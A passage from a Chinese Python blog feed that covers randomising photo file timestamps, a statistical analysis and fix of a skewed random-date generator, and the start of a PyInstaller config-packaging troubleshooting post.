class="subst">{file_name}</span>修改失败，错误信息：<span class="subst">{e}</span>"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">time_struct</span>(<span class="params">times</span>):</span><br><span class="line">        time_format = <span class="string">"%Y-%m-%d %H:%M:%S"</span>  <span class="comment"># 时间格式</span></span><br><span class="line">        <span class="keyword">return</span> time.localtime(time.mktime(time.strptime(times, time_format)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(file_list):</span><br><span class="line">        same_day_random_num = random.randint(<span class="number">1</span>, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> same_day_random_num &gt; <span class="built_in">len</span>(file_list):</span><br><span class="line">            <span class="comment"># 如果生成的当天照片数量大于当前的文件总数，数量由当前文件总数决定</span></span><br><span class="line">            same_day_random_num = <span class="built_in">len</span>(file_list)</span><br><span class="line">        </span><br><span class="line">        random.shuffle(file_list)</span><br><span class="line">        my_file = FileHandle()</span><br><span class="line">        my_file.generate_date()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(same_day_random_num):</span><br><span class="line">            filename = file_list[i]</span><br><span class="line">            my_file.generate_time()</span><br><span class="line">            my_file.modify_file_time(filename)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">del</span> file_list[:same_day_random_num]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'已全部修改。'</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<hr>
<h1 id="参考信息">4. 参考信息</h1>
<p><a href="https://blog.csdn.net/dengnihuilaiwpl/article/details/86551720">python 修改任意文件的创建时间、修改时间、访问时间。</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>exif</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 generate_date 方法生成的日期结果离散性分析与优化</title>
    <url>/p/528c0f55.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在上一篇<a href="/p/c046778c.html" target="_blank">《【Python】
基于 Windows 平台批量修改图片 EXIF 信息》</a>博文中，提到了利用 random 模块，生成指定日期范围的随机个日期值，但对于其实际生成的结果，是否真的呈现出离散性随机分布，本篇博文将对此进行分析验证，并依据分析结果，研究是否存在可优化的空间。</p>
<span id="more"></span>
<hr>
<h1 id="离散性分析">2. 离散性分析</h1>
<h2 id="数据生成">2.1. 数据生成</h2>
<p>  由于原博文中的代码是用于修改文件时间属性的，直接引用过来不适用，所以精简了一部分源代码，generate_date 方法原样保留，不做修改。</p>
<p>  最终用于数据生成的代码如下所示。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">pd.set_option(<span class="string">"display.max_rows"</span>, <span class="number">2000</span>) <span class="comment"># 设置打印分析结果展示的最大行数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">''</span></span><br><span class="line">        <span class="variable language_">self</span>.time = <span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_date</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 指定日期生成的范围</span></span><br><span class="line">        year = random.randint(<span class="number">2020</span>, <span class="number">2021</span>)</span><br><span class="line">        month = random.randint(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断如果随机生成的年和月大于当前年份和月份，那么月份直接用当前月份</span></span><br><span class="line">        <span class="keyword">if</span> year == datetime.now().year <span class="keyword">and</span> month &gt; datetime.now().month:</span><br><span class="line">            max_day = datetime.now().day</span><br><span class="line">            month = datetime.now().month</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_day = calendar.monthrange(year, month)[<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 在指定的月份范围内，随机生成一天</span></span><br><span class="line">        day = random.randint(<span class="number">1</span>, max_day)</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">f"<span class="subst">{year}</span>-<span class="subst">{month}</span>-<span class="subst">{day}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.date</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cnt = <span class="number">10000</span>  <span class="comment"># 数据样本变量</span></span><br><span class="line">    date_list = []      <span class="comment"># 生成的日期列表</span></span><br><span class="line">    </span><br><span class="line">    my_file = FileHandle()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">        date = my_file.generate_date()</span><br><span class="line">        date_list.append(date)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 通过pandas模块的value_counts方法，统计结果</span></span><br><span class="line">    analysis_res = pd.Series(date_list).value_counts()</span><br><span class="line">    <span class="built_in">print</span>(analysis_res)</span><br></pre></td></tr></tbody></table></figure>
<h2 id="结果分析">2.2. 结果分析</h2>
<p>  当把 pandas 模块统计出来的日期分布数据，用 Excel 生成折线图时，结果很惊人。前面一大段，数据十分正常的上下浮动，到了 2021 年 1 月（也就是代码执行的此时此刻），折线图陡然上升，整个一月份的日期数据，都比前面时间要多出近乎 10 倍。使用 <code>analysis_res.var()</code> 函数求得 analysis_res 变量数据集的方差值为：1781.7798768541843。</p>
<p><img src="/p/528c0f55/U100a9cae07054064a17e2591af38f5717.webp"></p>
<h2 id="问题究因">2.3. 问题究因</h2>
<p>  这样的结果到底是如何生成的呢？于是我走读了一遍又一遍的源代码，特别是 generate_date 方法部分，终于，在下面的这段代码里，找到了问题根因。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> year == datetime.now().year <span class="keyword">and</span> month &gt; datetime.now().month:</span><br><span class="line">    max_day = datetime.now().day</span><br><span class="line">    month = datetime.now().month</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>  在这段代码中，我为了不让生成的日期数据大于当前的日期，加了一个 if 语句的双重条件判断，当两个条件（生成的年份等于今年，且生成的月份大于当前月份）均满足时，会将原生成的年月被成当前年月所替换，这就导致了有相当大一部分的日期数据被强制性地修改到了 2021 年 1 月。</p>
<p>  简单统计了下一月份的总数据，惊人的达到了 4997，占了总样本数量的一半。</p>
<h2 id="代码优化">2.4. 代码优化</h2>
<p>  既然原来代码中 generate_date 方法生成的日期数据，不太符合我的个人需求，那就只能另辟蹊径了。通过一番上网查找资料后，发现可以利用 datetime 模块，对日期 / 时间数据经过简单地格式转换，就可以直接相加减了。</p>
<p>  整理了一下相关模块的用法，大致确认了下实现方案，说明如下。</p>
<ol type="1">
<li><p>首先，定义两个变量：start_date 和 end_date，指定需要生成日期的范围。其中用到了 datetime 模块的 strptime 方法，转换成统一的的格式及数据类型。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">start_date = datetime.strptime(<span class="string">'2020-01-01'</span>, <span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">end_date = datetime.strptime(<span class="built_in">str</span>(datetime.now().date()), <span class="string">'%Y-%m-%d'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(start_date))     </span><br><span class="line"><span class="comment"># output: &lt;class 'datetime.datetime'&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(end_date))</span><br><span class="line"><span class="comment"># output: &lt;class 'datetime.datetime'&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>然后，计算出起止时间范围内的总天数。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">all_range_day_num = (end_date - start_date).days</span><br><span class="line"><span class="built_in">print</span>(all_range_day_num)</span><br><span class="line"><span class="comment"># output: 393</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>接着，利用 random 模块中的 randint 方法，在 [0, all_range_day_num -
1] 范围内，随机生成一个整型值。<br> &gt; 备注： &gt;
此处需要减一的原因是：生成的总天数不包含结束日期这一天。例如：开始日期和结束日期分别是 <code>2021-01-01</code> 和 <code>2021-01-05</code> 时，计算出来的总天数是 4 天。如果不减一，那么生成的最晚日期 =<code>2021-01-05</code>，再结合后续随机生成的时间，极有可能会晚于 2021-01-05 当天的时间，对于照片创建时间来说，显然不合理。</p></li>
</ol>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">rand_day = random.randint(<span class="number">0</span>, all_range_day_num - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># output: rand_day = 346</span></span><br></pre></td></tr></tbody></table></figure>
<ol start="4" type="1">
<li>最后，将整型值与开始日期 start_date 相加，便得到了一个在起止日期范围内的随机日期值。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">n_days = start_date + timedelta(days=rand_day)</span><br><span class="line"><span class="comment"># output: n_days = 2020-12-12 00:00:00</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="数据再生成">2.5. 数据再生成</h2>
<p>  优化后的完整代码如下所示。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">pd.set_option(<span class="string">"display.max_rows"</span>, <span class="number">2000</span>)  <span class="comment"># 设置打印分析结果展示的最大行数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日期生成的起止范围</span></span><br><span class="line">start_date = datetime.strptime(<span class="string">'2020-01-01'</span>, <span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">end_date = datetime.strptime(<span class="built_in">str</span>(datetime.now().date()), <span class="string">'%Y-%m-%d'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">''</span></span><br><span class="line">        <span class="variable language_">self</span>.time = <span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_date</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 计算出起止范围内的总天数</span></span><br><span class="line">        all_range_day_num = (end_date - start_date).days</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 开始日期 + 随机生成的天数</span></span><br><span class="line">        rand_day = random.randint(<span class="number">0</span>, all_range_day_num - <span class="number">1</span>)</span><br><span class="line">        n_days = start_date + timedelta(days=rand_day)</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.date = n_days.date()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.date</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cnt = <span class="number">10000</span>  <span class="comment"># 数据样本变量</span></span><br><span class="line">    date_list = []  <span class="comment"># 生成的日期列表</span></span><br><span class="line">    </span><br><span class="line">    my_file = FileHandle()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">        date = my_file.generate_date()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将生成的日期追加至date_list列表中</span></span><br><span class="line">        date_list.append(date)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 通过pandas模块的value_counts方法，统计结果</span></span><br><span class="line">    analysis_res = pd.Series(date_list).value_counts()</span><br><span class="line">    <span class="built_in">print</span>(analysis_res)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="结果再分析">2.6. 结果再分析</h2>
<p>  执行完优化过后的代码，同样将 pandas 模块的统计结果，用 Excel 绘制成折线图，如下图所示。</p>
<p>  再次通过 <code>analysis_res.var()</code> 函数求得数据库的方差值为：5.372579615575574，相比之前的方差值，下降率为：</p>
<svg xmlns="http://www.w3.org/2000/svg" width="30.899ex" height="4.661ex" viewbox="0 -1352 13657.6 2060" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style="">
<defs><path id="MJX-37-TEX-N-394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/><path id="MJX-37-TEX-I-1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"/><path id="MJX-37-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/><path id="MJX-37-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path id="MJX-37-TEX-N-37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"/><path id="MJX-37-TEX-N-38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"/><path id="MJX-37-TEX-N-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/><path id="MJX-37-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/><path id="MJX-37-TEX-N-35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"/><path id="MJX-37-TEX-N-33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/><path id="MJX-37-TEX-N-2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"/><path id="MJX-37-TEX-N-39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"/><path id="MJX-37-TEX-N-25" d="M465 605Q428 605 394 614T340 632T319 641Q332 608 332 548Q332 458 293 403T202 347Q145 347 101 402T56 548Q56 637 101 693T202 750Q241 750 272 719Q359 642 464 642Q580 642 650 732Q662 748 668 749Q670 750 673 750Q682 750 688 743T693 726Q178 -47 170 -52Q166 -56 160 -56Q147 -56 142 -45Q137 -36 142 -27Q143 -24 363 304Q469 462 525 546T581 630Q528 605 465 605ZM207 385Q235 385 263 427T292 548Q292 617 267 664T200 712Q193 712 186 709T167 698T147 668T134 615Q132 595 132 548V527Q132 436 165 403Q183 385 203 385H207ZM500 146Q500 234 544 290T647 347Q699 347 737 292T776 146T737 0T646 -56Q590 -56 545 0T500 146ZM651 -18Q679 -18 707 24T736 146Q736 215 711 262T644 309Q637 309 630 306T611 295T591 265T578 212Q577 200 577 146V124Q577 -18 647 -18H651Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-37-TEX-N-394"/></g><g data-mml-node="mi" transform="translate(833, 0)"><use xlink:href="#MJX-37-TEX-I-1D437"/></g><g data-mml-node="mo" transform="translate(1938.8, 0)"><use xlink:href="#MJX-37-TEX-N-3D"/></g><g data-mml-node="mfrac" transform="translate(2994.6, 0)"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="mn"><use xlink:href="#MJX-37-TEX-N-31"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(500, 0)"/><use xlink:href="#MJX-37-TEX-N-38" transform="translate(1000, 0)"/><use xlink:href="#MJX-37-TEX-N-31" transform="translate(1500, 0)"/><use xlink:href="#MJX-37-TEX-N-2E" transform="translate(2000, 0)"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(2278, 0)"/><use xlink:href="#MJX-37-TEX-N-38" transform="translate(2778, 0)"/></g><g data-mml-node="mo" transform="translate(3500.2, 0)"><use xlink:href="#MJX-37-TEX-N-2212"/></g><g data-mml-node="mn" transform="translate(4500.4, 0)"><use xlink:href="#MJX-37-TEX-N-35"/><use xlink:href="#MJX-37-TEX-N-2E" transform="translate(500, 0)"/><use xlink:href="#MJX-37-TEX-N-33" transform="translate(778, 0)"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(1278, 0)"/></g></g><g data-mml-node="mn" transform="translate(1720.2, -686)"><use xlink:href="#MJX-37-TEX-N-31"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(500, 0)"/><use xlink:href="#MJX-37-TEX-N-38" transform="translate(1000, 0)"/><use xlink:href="#MJX-37-TEX-N-31" transform="translate(1500, 0)"/><use xlink:href="#MJX-37-TEX-N-2E" transform="translate(2000, 0)"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(2278, 0)"/><use xlink:href="#MJX-37-TEX-N-38" transform="translate(2778, 0)"/></g><rect width="6478.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(9990.8, 0)"><use xlink:href="#MJX-37-TEX-N-2248"/></g><g data-mml-node="mn" transform="translate(11046.6, 0)"><use xlink:href="#MJX-37-TEX-N-39"/><use xlink:href="#MJX-37-TEX-N-39" transform="translate(500, 0)"/><use xlink:href="#MJX-37-TEX-N-2E" transform="translate(1000, 0)"/><use xlink:href="#MJX-37-TEX-N-37" transform="translate(1278, 0)"/></g><g data-mml-node="mi" transform="translate(12824.6, 0)"><use xlink:href="#MJX-37-TEX-N-25"/></g></g></g>
</svg>
<p>  综上所述，优化后的生成日期方法，其日期分布情况以及数据离散性，已基本符合了我的个人需求。</p>
<p><img src="/p/528c0f55/t02ce8ccfbd173dcc33.webp">
<img src="/p/528c0f55/Ub6336cd607124a8ea8162bd287976a9cR.webp"></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>离散性分析</tag>
        <tag>统计分析</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 pyinstaller 打包项目时，配置文件无法打包的解决方法</title>
    <url>/p/289e731e.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  在使用 python 编写测试小工具的时候，不得不考虑的一个场景就是 python 运行环境。在公司内部的测试环境，还可以通过局域网的方式安装类似的虚拟环境；而到了客户现场，由于其网络因素或其他客观条件，无法方便的安装运行环境；同时小工具受众人数较多的话，每台电脑都需要安装一次虚拟环境，其维护时间成本就随之而来。
  因此，咱们可以通过 pyinstaller 工具，将整个 python 项目文件夹打包成一个独立的小工具，无需额外安装虚拟环境即可运行，也大大节约了维护成本，工具后续的更新，也只需要替换必要的程序即可。
  然而在测试打包小工具的过程中，出现了几个小问题，通过借助搜搜引擎和不断地尝试，得以完美解决。现将遇到的问题及对应的解决方法记录如下。
<span id="more"></span></p>
<hr>
<h1 id="源代码结构">2. 源代码结构</h1>
<p>  利用 <code>tree /a /f &gt; tree_info.txt</code> 命令，删除冗余信息后的程序目录结构如下，<code>main.py</code> 作为入口程序，其他各模块的功能及说明，详见<a href="/p/ff686ad5.html" target="_blank">《【Python】基于
unittest 模块设计自动化测试框架》</a>博客。 </p><figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">卷 Entertainments 的文件夹 <span class="built_in">PATH</span> 列表</span><br><span class="line">卷序列号为 F4C6-<span class="number">5</span>C94</span><br><span class="line"><span class="function">E:.</span></span><br><span class="line"><span class="function">│  <span class="title">main.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">README.md</span></span></span><br><span class="line"><span class="function">│  <span class="title">requirements.txt</span></span></span><br><span class="line"><span class="function">│          </span></span><br><span class="line"><span class="function">├─<span class="title">common</span></span></span><br><span class="line"><span class="function">│  │  <span class="title">get_config.py</span></span></span><br><span class="line"><span class="function">│  │  <span class="title">get_root_path.py</span></span></span><br><span class="line"><span class="function">│  │  <span class="title">get_test_data.py</span></span></span><br><span class="line"><span class="function">│          </span></span><br><span class="line"><span class="function">├─<span class="title">config</span></span></span><br><span class="line"><span class="function">│      <span class="title">config.yml</span></span></span><br><span class="line"><span class="function">│      </span></span><br><span class="line"><span class="function">├─<span class="title">testCase</span></span></span><br><span class="line"><span class="function">│  ├─<span class="title">login_101</span></span></span><br><span class="line"><span class="function">│  │  │  <span class="title">login_case.py</span></span></span><br><span class="line"><span class="function">│          </span></span><br><span class="line"><span class="function">├─<span class="title">testData</span></span></span><br><span class="line"><span class="function">│      <span class="title">login_101_data.yml</span></span></span><br><span class="line"><span class="function">│      <span class="title">module_102_data.yml</span></span></span><br><span class="line"><span class="function">│      </span></span><br><span class="line"><span class="function">├─<span class="title">testResult</span></span></span><br><span class="line"><span class="function">│      <span class="title">login_101_report.html</span></span></span><br><span class="line"><span class="function">│      </span></span><br><span class="line"><span class="function">└─<span class="title">testSteps</span></span></span><br><span class="line"><span class="function">    ├─<span class="title">login_module_101</span></span></span><br><span class="line"><span class="function">    │    <span class="title">login_utils.py</span></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<hr>
<h1 id="问题记录">3. 问题记录</h1>
<h2 id="名称exit未定义">3.1. 名称 <code>exit</code> 未定义</h2>
<h3 id="问题浮现">3.1.1. 问题浮现</h3>
<ol type="1">
<li>通过如下命令，将工具打包成了一个文件夹形式的程序包，运行后发现报错信息如下。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">pyinstaller -D -c main.py</span><br></pre></td></tr></tbody></table></figure> <figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">boyce</span>\<span class="title">Desktop</span>\<span class="title">dist</span>\<span class="title">main</span>&gt;<span class="title">main.exe</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">boyce</span>\<span class="title">Desktop</span>\<span class="title">dist</span>\<span class="title">main</span>\<span class="title">config</span>\<span class="title">config.yml</span> <span class="title">file</span> <span class="title">is</span> <span class="title">not</span> <span class="title">exist</span>, <span class="title">please</span> <span class="title">check</span> <span class="title">again</span>.</span></span><br><span class="line"><span class="function"><span class="title">Traceback</span> (<span class="title">most</span> <span class="title">recent</span> <span class="title">call</span> <span class="title">last</span>):</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">main.py</span>", <span class="title">line</span> 10, <span class="title">in</span> &lt;<span class="title">module</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 991, <span class="title">in</span> <span class="title">_find_and_load</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 975, <span class="title">in</span> <span class="title">_find_and_load_unlocked</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 671, <span class="title">in</span> <span class="title">_load_unlocked</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">PyInstaller</span>\<span class="title">loader</span>\<span class="title">pyimod03_importers.py</span>", <span class="title">line</span> 540, <span class="title">in</span> <span class="title">exec_module</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">testCase</span>\<span class="title">login_101</span>\<span class="title">login_case.py</span>", <span class="title">line</span> 12, <span class="title">in</span> &lt;<span class="title">module</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 991, <span class="title">in</span> <span class="title">_find_and_load</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 975, <span class="title">in</span> <span class="title">_find_and_load_unlocked</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "&lt;<span class="title">frozen</span> <span class="title">importlib._bootstrap</span>&gt;", <span class="title">line</span> 671, <span class="title">in</span> <span class="title">_load_unlocked</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">PyInstaller</span>\<span class="title">loader</span>\<span class="title">pyimod03_importers.py</span>", <span class="title">line</span> 540, <span class="title">in</span> <span class="title">exec_module</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">testSteps</span>\<span class="title">login_module_101</span>\<span class="title">login_utils.py</span>", <span class="title">line</span> 12, <span class="title">in</span> &lt;<span class="title">module</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">common</span>\<span class="title">get_config.py</span>", <span class="title">line</span> 21, <span class="title">in</span> <span class="title">__init__</span></span></span><br><span class="line"><span class="function"><span class="title">NameError</span>: <span class="title">name</span> '<span class="title">exit</span>' <span class="title">is</span> <span class="title">not</span> <span class="title">defined</span></span></span><br><span class="line"><span class="function">[5204] <span class="title">Failed</span> <span class="title">to</span> <span class="title">execute</span> <span class="title">script</span> <span 